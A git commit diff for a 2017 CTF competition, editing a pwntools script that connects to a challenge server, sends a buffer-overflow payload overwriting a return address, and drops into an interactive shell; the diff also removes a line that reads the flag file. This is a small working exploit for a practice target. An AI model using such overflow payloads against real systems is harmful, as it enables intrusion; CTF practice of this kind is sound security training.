9ad0ae7bfd2a77afe9c77d900c6231a195795445
yuan <ssspeed00@gmail.com>
2017-07-22 14:35:02 +0800

    CGCTF 2017

--- kidding/flag.py
+++ kidding/flag.py
@@ -4,16 +4,14 @@ from pwn import *
 
 #host , port = '172.16.115.109' , 10100
 #host , port = '192.168.78.252' , 4000
-host , port = 'ctf.yuawn.idv.tw' , 10105
+host , port = 'ctf.yuawn.idv.tw' , 10100
 y = remote( host , port )
 
 p = 'a' * 24
-p += p32( 0x80484eb )
+p += p32( 0x80484ce )
 
 log.success('Attack payload -> {}'.format(p))
 
 y.send(p)
-
-y.send('cat /home/`whoami`/flag\n')
 
 y.interactive()
